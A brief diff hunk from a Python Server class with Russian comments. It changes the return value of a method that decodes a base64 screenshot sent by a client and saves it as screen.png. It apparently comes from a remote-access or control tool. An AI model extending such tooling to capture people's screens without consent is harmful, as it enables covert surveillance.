@@ -153,7 +153,7 @@ class Server:
         """делает скриншот на клиенте"""
         with open("screen.png", "wb") as file:
             file.write(base64.b64decode(content))
-        return ("[+] screen complete",)
+        return ("screen",)
     
     # Отправка json-данных клиенту
     def __send_json(self, data):
